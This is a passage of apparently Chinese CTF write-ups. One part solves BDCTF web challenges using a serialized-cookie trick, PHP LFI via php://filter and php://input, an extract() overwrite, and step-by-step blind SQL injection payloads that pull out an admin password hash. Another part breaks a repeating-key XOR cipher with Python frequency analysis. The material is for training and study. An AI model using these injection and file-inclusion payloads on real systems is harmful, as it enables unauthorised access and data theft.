id="WEB100-2"><a href="#WEB100-2" class="headerlink" title="WEB100-2"></a>WEB100-2</h4><blockquote><p>提示是?hint，格式是flag{xxxx}<br><a href="http://78a06773a04246464d8eeadd2cdf28af.yogeit.com:8080" target="_blank" rel="noopener">http://78a06773a04246464d8eeadd2cdf28af.yogeit.com:8080</a></p></blockquote><p>根据提示访问<a href="http://127.0.0.1/ctfoj/bdctf.php?hint" target="_blank" rel="noopener">http://127.0.0.1/ctfoj/bdctf.php?hint</a> 得到源码。<br>带上<code>Cookie: BDCTF=s:21:&quot;BDCTF:www.bluedon.com&quot;%3b</code> 即可得到<code>flag{pBXeeZdOkG1QTP1}</code> 。cookie中的分号要url编码一下。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line">error_reporting(<span class="number">0</span>);  </span><br><span class="line">$KEY=<span class="string">'BDCTF:www.bluedon.com'</span>;  </span><br><span class="line"><span class="keyword">include_once</span>(<span class="string">"flag.php"</span>);  </span><br><span class="line"></span><br><span class="line">$cookie = $_COOKIE[<span class="string">'BDCTF'</span>];  </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'hint'</span>]))&#123;  </span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="keyword">elseif</span> (unserialize($cookie) === <span class="string">"$KEY"</span>)  </span><br><span class="line">&#123;     </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"$flag"</span>;  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="keyword">else</span> &#123;  foo</span><br></pre></td></tr></table></figure><h4 id="蓝盾管理员"><a href="#蓝盾管理员" class="headerlink" title="蓝盾管理员"></a>蓝盾管理员</h4><blockquote><p>you are not bd-admin，格式bdctf{xxx}<br><a href="http://2a8da10821f39ea335a12fba77f7c3fc.yogeit.com:8080" target="_blank" rel="noopener">http://2a8da10821f39ea335a12fba77f7c3fc.yogeit.com:8080</a></p></blockquote><p>访问<code>view-source:http://2a8da10821f39ea335a12fba77f7c3fc.yogeit.com:8080/?file=php://filter/convert.base64-encode/resource=flag.php&amp;user=php://input</code> 同时post <code>the user is bdadmin</code> 得到<code>bd-admin!&lt;br&gt;PD9waHAgIA0KLy9iZGN0ZntMZmlfQW5EX01vcmV9ICANCj8+</code> ，解码后得到<code>bdctf{Lfi_AnD_More}</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//index.php</span></span><br><span class="line">&lt;!--  </span><br><span class="line">@$user = $_GET[<span class="string">"user"</span>];  </span><br><span class="line">@$file = $_GET[<span class="string">"file"</span>];  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($user)&amp;&amp;(file_get_contents($user,<span class="string">'r'</span>)===<span class="string">"the user is bdadmin"</span>))&#123;  </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"hello bd-admin!&lt;br&gt;"</span>;  </span><br><span class="line"><span class="keyword">include</span>($file); <span class="comment">//flag.php  </span></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;  </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"you are not bd-admin ! "</span>;  </span><br><span class="line">&#125;  </span><br><span class="line"> --&gt;</span><br></pre></td></tr></table></figure><h4 id="送大礼"><a href="#送大礼" class="headerlink" title="送大礼"></a>送大礼</h4><blockquote><p>格式bdctf{xxx}<br><a href="http://04c432a12784d2fb5ef431ec3366bc9a.yogeit.com:8080" target="_blank" rel="noopener">http://04c432a12784d2fb5ef431ec3366bc9a.yogeit.com:8080</a></p></blockquote><p>访问 <code>http://04c432a12784d2fb5ef431ec3366bc9a.yogeit.com:8080/flag.txt</code>  有jsfuck，<a href="http://codertab.com/jsunfuck" target="_blank" rel="noopener">解开</a> 后内容如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">extract($_GET);  </span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($bdctf))  </span><br><span class="line">&#123;      </span><br><span class="line">  $content=trim(file_get_contents($flag));</span><br><span class="line">  <span class="keyword">if</span>($bdctf==$content)</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">echo</span><span class="string">'bdctf&#123;**********&#125;'</span>;</span><br><span class="line">  &#125;    <span class="keyword">else</span></span><br><span class="line">  &#123; </span><br><span class="line">    <span class="keyword">echo</span><span class="string">'这不是蓝盾的密码啊'</span>;</span><br><span class="line">  &#125; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>访问 <code>http://04c432a12784d2fb5ef431ec3366bc9a.yogeit.com:8080/?bdctf=foo&amp;flag=php://input</code> 同时post <code>foo</code> 得到<code>bdctf{UCCdlsZyVe}</code> 。</p><h4 id="火星撞地球"><a href="#火星撞地球" class="headerlink" title="火星撞地球"></a>火星撞地球</h4><blockquote><p>flag{1q2w3e4r}<br>密码就是答案，格式flag{xxxx}<br><a href="http://eef6f0186546043da56bf4c7f7e6d3ca.yogeit.com:8080" target="_blank" rel="noopener">http://eef6f0186546043da56bf4c7f7e6d3ca.yogeit.com:8080</a></p></blockquote><p>获取当前数据库名member</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">name=admin%27%20and%20(ASCII(MID((database()),6,1)))=114%23&amp;password=%27%20or%201&amp;submit2=%E4%BC%9A%E5%91%98%E7%99%BB%E5%BD%95</span><br></pre></td></tr></table></figure><p>当前数据库只有一个表</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">name=admin%27%20and%20(ASCII(MID((select%20count(table_name)%20from%20information_schema.tables%20where%20table_schema=database()),1,1)))=49%23&amp;password=%27%20or%201&amp;submit2=%E4%BC%9A%E5%91%98%E7%99%BB%E5%BD%95</span><br></pre></td></tr></table></figure><p>当前表名为member</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">name=admin%27%20and%20(ASCII(MID((select%20table_name%20from%20information_schema.tables%20where%20table_schema=database()%20limit%200,1),7,1)))&gt;0%23&amp;password=%27%20or%201&amp;submit2=%E4%BC%9A%E5%91%98%E7%99%BB%E5%BD%95</span><br></pre></td></tr></table></figure><p>当前表有四条记录</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">name=admin%27%20and%20(ASCII(MID((select%20count(*)%20from%20member),1,1)))=52%23&amp;password=%27%20or%201&amp;submit2=%E4%BC%9A%E5%91%98%E7%99%BB%E5%BD%95</span><br></pre></td></tr></table></figure><p>得到列名’id,member_user,member_password,member_name，。。。’</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">name=admin%27%20and%20(ASCII(MID((select%20group_concat(column_name)%20from%20information_schema.columns%20where%20table_schema=&apos;member&apos;),44,1)))&gt;44%23&amp;password=%27%20or%201&amp;submit2=%E4%BC%9A%E5%91%98%E7%99%BB%E5%BD%95</span><br></pre></td></tr></table></figure><p>查询密码字段 burp爆破得到’5416d7cd6ef195a0f7622a9c56b55e84’，即’1q2w3e4r’。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">name=admin%27%20and%20(ASCII(MID((select%20member_password%20from%20member%20where%20member_user=&apos;admin&apos;),1,1)))=53%23&amp;password=%27%20or%201&amp;submit2=%E4%BC%9A%E5%91%98%E7%99%BB%E5%BD%95</span><br></pre></td></tr></table></figure><p>最后flag为<code>flag{1q2w3e4r}</code> </p><h4 id="密室杀人案-x"><a href="#密室杀人案-x" class="headerlink" title="密室杀人案[x]"></a>密室杀人案[x]</h4><blockquote><p>格式bdctf{xxxx}<br><a href="http://417c9d88ead6809efb1d310fe6832f56.yogeit.com:8080" target="_blank" rel="noopener">http://417c9d88ead6809efb1d310fe6832f56.yogeit.com:8080</a></p></blockquote><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">bdctf--密室谋杀案</span><br><span class="line">这是一场发生在PHP序列化密室里面的谋杀案，今日这里发生了一起密室谋杀案，有一个名叫flag的人被杀害。案发现场发生在这个家里面，然而flag他的尸体被嫌疑人藏匿了起来,无法获得更多被害人的信息。 作案的嫌疑人在这个屋子里面，在这屋子里面的人有三兄弟和一个侦探 ，三兄弟中老大Ford权威最高，其他兄弟都在它的保护下生活,因为三兄弟的勤劳勇敢也经常被其他人调去工作任劳任怨。二哥Walker性格生性好动，喜欢结交朋友也经常找老三帮忙。 老三David为人老实憨厚，和二哥关系最好却有一天因为某件事情离开了这个家,成立了另外一个家。还有就是侦探，侦探wesley他案发当天也在现场，他似乎知道些什么但似乎迫于某种压力没有说出凶手是谁。 只要你收集足够多三兄弟的信息给wesley，相信他会说出真相。</span><br></pre></td></tr></table></figure><h4 id="bluedon用户-x"><a href="#bluedon用户-x" class="headerlink" title="bluedon用户[x]"></a>bluedon用户[x]</h4><blockquote><p>格式，bdctf{xxxxx}<br><a href="http://11537c131de3f8b2060b36c0cf7eb083.yogeit.com:8080" target="_blank" rel="noopener">http://11537c131de3f8b2060b36c0cf7eb083.yogeit.com:8080</a></p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//index.php</span></span><br><span class="line">you are not bluedon ! </span><br><span class="line">&lt;!--</span><br><span class="line">$user = $_GET[<span class="string">"user"</span>];</span><br><span class="line">$file = $_GET[<span class="string">"file"</span>];</span><br><span class="line">$pass = $_GET[<span class="string">"pass"</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($user)&amp;&amp;(file_get_contents($user,<span class="string">'r'</span>)===<span class="string">"the user is bluedon"</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"hello bluedon!&lt;br&gt;"</span>;</span><br><span class="line">    <span class="keyword">include</span>($file); <span class="comment">//class.php</span></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"you are not bluedon ! "</span>;</span><br><span class="line">&#125;</span><br><span class="line"> --&gt;</span><br><span class="line">   </span><br><span class="line"><span class="comment">//class.php</span></span><br><span class="line"><span class="comment">//view-source:http://11537c131de3f8b2060b36c0cf7eb083.yogeit.com:8080/?file=php://filter/convert.base64-encode/resource=class.php&amp;user=php://input</span></span><br><span class="line"></span><br><span class="line">the user is bluedon</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Read</span></span>&#123;<span class="comment">//f1a9.php</span></span><br><span class="line">    <span class="keyword">public</span> $file;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;file))&#123;</span><br><span class="line">            <span class="keyword">echo</span> file_get_contents(<span class="keyword">$this</span>-&gt;file);    </span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"恭喜get flag"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    <entry>
      <title>南邮CTF平台 Vigenere writeup</title>
      <link href="/171005NuptVigenereWP/"/>
      <url>/171005NuptVigenereWP/</url>
      
        <content type="html"><![CDATA[<h3 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h3><blockquote><p> It is said that Vigenere cipher does not achieve the perfect secrecy actually :-)</p><p> Tips:<br> 1.The encode pragram is given;<br> 2.Do u no <a href="https://en.wikipedia.org/wiki/Index_of_coincidence" target="_blank" rel="noopener">index of coincidence </a>？<br> 3.The key is last 6 words of the plain text(with “nctf{}” when submitted, also without any interpunction)</p><p> <a href="http://ctf.nuptsast.com/static/uploads/13706e3281c1fb0c04417d3452cb745b/encode.cpp" target="_blank" rel="noopener">encode.cpp</a>   <a href="http://ctf.nuptsast.com/static/uploads/9a27a6c8b9fb7b8d2a07ad94924c02e5/code.txt" target="_blank" rel="noopener">code.txt</a> </p></blockquote><h3 id="什么是异或"><a href="#什么是异或" class="headerlink" title="什么是异或"></a>什么是异或</h3><p>异或（exclusive or）是二元逻辑运算符，符号为 XOR 或 EOR 或 ⊕或 ^ 。对于表达式 <code>a^b</code> 的取值，当且仅当a、b逻辑值不同时为真。具体来说就是四个式子：<code>1^1=0;    0^0=0;    1^0=1;    0^1=1</code> 。另外，异或有一些基本的特性，<strong>本题仅用到第七行的特性</strong>即可。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">a^a=<span class="number">0</span>;</span><br><span class="line">a^<span class="number">0</span>=a;</span><br><span class="line">a^b=b^a;</span><br><span class="line">a^(b^c)=(a^b)^c;</span><br><span class="line">a^b^b=a;</span><br><span class="line">------------------------------------------</span><br><span class="line">如果 cipher = plain ^ key，那么 plain = cipher ^ key</span><br><span class="line">简单地证明一下：</span><br><span class="line">        c = p ^ k</span><br><span class="line"> --&gt;  c ^ k = p ^ k ^ k</span><br><span class="line"> --&gt;  c ^ k = p</span><br><span class="line">------------------------------------------</span><br><span class="line">一个以字节为单位进行异或的例子：</span><br><span class="line">  <span class="number">97</span>^<span class="number">98</span>--&gt; <span class="number">01100001</span> ^ <span class="number">01100010</span> = <span class="number">00000011</span> -&gt; <span class="number">3</span></span><br></pre></td></tr></table></figure><h3 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h3><p>我们知道，英文中的每个字母使用频率是不同的，在够长的一段话里，各个字母的占比大致稳定，并且这个稳定值也已经用巨大的语料库统计出来了，这就是<a href="https://zh.wikipedia.org/wiki/%E5%AD%97%E6%AF%8D%E9%A2%91%E7%8E%87" target="_blank" rel="noopener">字母频率</a>。这种统计层面的现象，就给我们提供了判断一段文字是否可能有意义的依据，并且这种判断可以通过编程轻松完成。然而，给定两个字母组合，只计算出其中各字母的占比是不够的，想要准确高效地比较两段文字谁更可能具备有意义的语义，我们最好算出一个归一化参数，用以直观表示可能性的大小，这就是文中提到的 <a href="https://en.wikipedia.org/wiki/Index_of_coincidence#Example" target="_blank" rel="noopener">correlation</a>  ，计算公式也是有的，<img src="https://wikimedia.org/api/rest_v1/media/math/render/svg/1b77b0ca8571bb219a9ad2ddf00b982d983d17d3" alt="\mathbf{\chi} = \sum_{i=1}^{c}n_i f_i">  ，其中n(i)指字母i在一段话的所有字母中所占的比例，f(i)就是已经统计出来的i字母的频率，具体如下所示。</p><p>字母频率列表：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">frequencies = &#123;<span class="string">"e"</span>: <span class="number">0.12702</span>, <span class="string">"t"</span>: <span class="number">0.09056</span>, <span class="string">"a"</span>: <span class="number">0.08167</span>, <span class="string">"o"</span>: <span class="number">0.07507</span>, <span class="string">"i"</span>: <span class="number">0.06966</span>,</span><br><span class="line">               <span class="string">"n"</span>: <span class="number">0.06749</span>, <span class="string">"s"</span>: <span class="number">0.06327</span>, <span class="string">"h"</span>: <span class="number">0.06094</span>, <span class="string">"r"</span>: <span class="number">0.05987</span>, <span class="string">"d"</span>: <span class="number">0.04253</span>,</span><br><span class="line">               <span class="string">"l"</span>: <span class="number">0.04025</span>, <span class="string">"c"</span>: <span class="number">0.02782</span>, <span class="string">"u"</span>: <span class="number">0.02758</span>, <span class="string">"m"</span>: <span class="number">0.02406</span>, <span class="string">"w"</span>: <span class="number">0.02360</span>,</span><br><span class="line">               <span class="string">"f"</span>: <span class="number">0.02228</span>, <span class="string">"g"</span>: <span class="number">0.02015</span>, <span class="string">"y"</span>: <span class="number">0.01974</span>, <span class="string">"p"</span>: <span class="number">0.01929</span>, <span class="string">"b"</span>: <span class="number">0.01492</span>,</span><br><span class="line">               <span class="string">"v"</span>: <span class="number">0.00978</span>, <span class="string">"k"</span>: <span class="number">0.00772</span>, <span class="string">"j"</span>: <span class="number">0.00153</span>, <span class="string">"x"</span>: <span class="number">0.00150</span>, <span class="string">"q"</span>: <span class="number">0.00095</span>,</span><br><span class="line">               <span class="string">"z"</span>: <span class="number">0.00074</span>&#125;</span><br></pre></td></tr></table></figure><h3 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h3><h4 id="理解加密"><a href="#理解加密" class="headerlink" title="理解加密"></a>理解加密</h4><p>题目的加密方式大致等价于这样写：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding:utf8</span></span><br><span class="line">key = [<span class="number">0xba</span>, <span class="number">0x1f</span>, <span class="number">0x91</span>, <span class="number">0xb2</span>, <span class="number">0x53</span>, <span class="number">0xcd</span>, <span class="number">0x3e</span>]  <span class="comment"># 长度范围是1-13，当然，我们还不知道key是多少</span></span><br><span class="line">plain = open(<span class="string">'ptext.txt'</span>).read()</span><br><span class="line">cipher = open(<span class="string">'ctext.txt'</span>, <span class="string">'w+'</span>)</span><br><span class="line">c = <span class="string">''</span></span><br><span class="line">k = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> p <span class="keyword">in</span> plain:</span><br><span class="line">    c += hex(ord(p) ^ key[k])[<span class="number">2</span>:].zfill(<span class="number">2</span>)</span><br><span class="line">    k = (k + <span class="number">1</span>) % len(key)</span><br><span class="line">cipher.write(c)</span><br></pre></td></tr></table></figure><p>程序意思是将明文和密钥逐字节异或，每次异或后的值用两位十六进制表示写入文件，也就是我们见到的code.txt，在这个过程中，密钥是循环使用的。</p><p>那么现在情况是这样的，我们知道：</p><blockquote><p> 密钥的长度区间为1-13字节</p><p> 加密方式为逐字节循环异或 </p><p> 加密结果，即密文的完整内容</p></blockquote><p>我们想知道</p><blockquote><p>明文内容 </p><p>密钥内容</p></blockquote><p>(⊙﹏⊙) 这看起来有点困难。</p><p>不过，其实还有两个不言而喻但非常重要的信息</p><blockquote><p>明文的每一个字节都是可见字符。</p><p>明文是一段有意义的话。</p></blockquote><h4 id="解密代码主程序"><a href="#解密代码主程序" class="headerlink" title="解密代码主程序"></a>解密代码主程序</h4><p>先放个主程序，和下面的对照着看。全部代码在<a href="#解密代码全文">文章底部</a> 。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    ps = []</span><br><span class="line">    ks = []</span><br><span class="line">    ss = []</span><br><span class="line">    ps.extend(xrange(<span class="number">32</span>, <span class="number">127</span>))</span><br><span class="line">    ks.extend(xrange(<span class="number">0xff</span> + <span class="number">1</span>))</span><br><span class="line">    ss.extend(xrange(<span class="number">1</span>, <span class="number">14</span>))</span><br><span class="line">    cipher = getCipher()</span><br><span class="line"></span><br><span class="line">    keyPool = getKeyPool(cipher=cipher, stepSet=ss, plainSet=ps, keySet=ks)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> keyPool:</span><br><span class="line">        freq = getFrequency(cipher, keyPool[i])</span><br><span class="line">        key = analyseFrequency(freq)</span><br><span class="line">        plain = vigenereDecrypt(cipher, key)</span><br><span class="line">        <span class="keyword">print</span> key, plain</span><br></pre></td></tr></table></figure><h4 id="确定密钥的长度和候选字符集"><a href="#确定密钥的长度和候选字符集" class="headerlink" title="确定密钥的长度和候选字符集"></a>确定密钥的长度和候选字符集</h4><p>明文由可见字符组成。这意味着任何一个使明文出现不可见字符的值都不可能出现在key里。<br>依据此可以取得两个进展。</p><ol><li>求出key的每一个字节有哪些候选字符。<br>具体操作：<br>当我们假设某一字节的key的值时，就可以使用前文提到的plain = cipher ^ key 求出这一字节密文对应的明文，如果这个明文是不可见的，那么我们假设的这个值就不可能出现在key的这个字节。<br>因为是循环异或，所以每个字节的key会去加密多个字节的明文，我们就可以如法炮制，大大缩小key的每个字节的候选字符集。</li><li>在1的基础上，确定key可能有哪几种长度。<br>具体操作：<br>我们假设key每一种可能的长度，一一去求对应的候选字符集， 如果有一种长度的key在某一字节的候选字符集为空，那么key就不可能是这个长度。</li></ol><p>至此，我们可以从无到有求得  <strong>key有哪些可能的长度</strong> 以及  <strong>key在每一种长度下对应的每个字节的候选字符集 </strong>。</p><p>上代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getKeyPool</span><span class="params">(cipher, stepSet, plainSet, keySet)</span>:</span></span><br><span class="line">    <span class="string">''' 传入的密文串、明文字符集、密钥字符集、密钥长度范围均作为数字列表处理.形如[0x11,0x22,0x33]</span></span><br><span class="line"><span class="string">        返回一个字典，以可能的密钥长度为键，以对应的每一字节的密钥字符集构成的列表为值，</span></span><br><span class="line"><span class="string">        密钥字符集为数字列表。</span></span><br><span class="line"><span class="string">            形如&#123;</span></span><br><span class="line"><span class="string">                    1:[[0x11]],</span></span><br><span class="line"><span class="string">                    3:[</span></span><br><span class="line"><span class="string">                        [0x11,0x33,0x46],</span></span><br><span class="line"><span class="string">                        [0x22,0x58],</span></span><br><span class="line"><span class="string">                        [0x33]</span></span><br><span class="line"><span class="string">                       ]</span></span><br><span class="line"><span class="string">                &#125;</span></span><br><span class="line"><span class="string">    '''</span></span><br><span class="line">    keyPool = dict()</span><br><span class="line">    <span class="keyword">for</span> step <span class="keyword">in</span> stepSet:</span><br><span class="line">        maybe = [<span class="keyword">None</span>] * step</span><br><span class="line">        <span class="keyword">for</span> pos <span class="keyword">in</span> xrange(step):</span><br><span class="line">            maybe[pos] = []</span><br><span class="line">            <span class="keyword">for</span> k <span class="keyword">in</span> keySet:</span><br><span class="line">                flag = <span class="number">1</span></span><br><span class="line">                <span class="keyword">for</span> c <span class="keyword">in</span> cipher[pos::step]:</span><br><span class="line">                    <span class="keyword">if</span> c ^ k <span class="keyword">not</span> <span class="keyword">in</span> plainSet:</span><br><span class="line">                        flag = <span class="number">0</span></span><br><span class="line">                <span class="keyword">if</span> flag:</span><br><span class="line">                    maybe[pos].append(k)</span><br><span class="line">        <span class="keyword">for</span> posPool <span class="keyword">in</span> maybe:</span><br><span class="line">            <span class="keyword">if</span> len(posPool) == <span class="number">0</span>:</span><br><span class="line">                maybe = []</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> len(maybe) != <span class="number">0</span>:</span><br><span class="line">            keyPool[step] = maybe</span><br><span class="line">    <span class="keyword">return</span> keyPool</span><br></pre></td></tr></table></figure><h4 id="遍历候选字符集，求出对应的字频"><a href="#遍历候选字符集，求出对应的字频" class="headerlink" title="遍历候选字符集，求出对应的字频"></a>遍历候选字符集，求出对应的字频</h4><p>这虽是个体力活，却也得小心翼翼。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getFrequency</span><span class="params">(cipher, keyPoolList)</span>:</span></span><br><span class="line">    <span class="string">''' 传入的密文作为数字列表处理</span></span><br><span class="line"><span class="string">        传入密钥的字符集应为列表，依次包含各字节字符集。</span></span><br><span class="line"><span class="string">            形如[[0x11,0x12],[0x22]]</span></span><br><span class="line"><span class="string">        返回字频列表，依次为各字节字符集中每一字符作为密钥组成部分时对应的明文字频</span></span><br><span class="line"><span class="string">            形如[&#123;</span></span><br><span class="line"><span class="string">                    0x11:&#123;'a':2,'b':3&#125;,</span></span><br><span class="line"><span class="string">                    0x12:&#123;'e':6&#125;</span></span><br><span class="line"><span class="string">                 &#125;,</span></span><br><span class="line"><span class="string">                 &#123;</span></span><br><span class="line"><span class="string">                    0x22:&#123;'g':1&#125;</span></span><br><span class="line"><span class="string">                 &#125;]</span></span><br><span class="line"><span class="string">    '''</span></span><br><span class="line">    freqList = []</span><br><span class="line">    keyLen = len(keyPoolList)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> xrange(keyLen):</span><br><span class="line">        posFreq = dict()</span><br><span class="line">        <span class="keyword">for</span> k <span class="keyword">in</span> keyPoolList[i]:</span><br><span class="line">            posFreq[k] = dict()</span><br><span class="line">            <span class="keyword">for</span> c <span class="keyword">in</span> cipher[i::keyLen]:</span><br><span class="line">                p = chr(k ^ c)</span><br><span class="line">                posFreq[k][p] = posFreq[k][p] + <span class="number">1</span> <span class="keyword">if</span> p <span class="keyword">in</span> posFreq[k] <span class="keyword">else</span> <span class="number">1</span></span><br><span class="line">        freqList.append(posFreq)</span><br><span class="line">    <span class="keyword">return</span> freqList</span><br></pre></td></tr></table></figure><h4 id="根据字频求得密钥"><a href="#根据字频求得密钥" class="headerlink" title="根据字频求得密钥"></a>根据字频求得密钥</h4><p>明文是一段有意义的话。这意味着它算出来的correlation值一定是所有候选明文中最大的，依照这一点就能挑出密钥每个字节的值，从而得到整个密钥。这也是整个解密过程最核心的一部分。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td 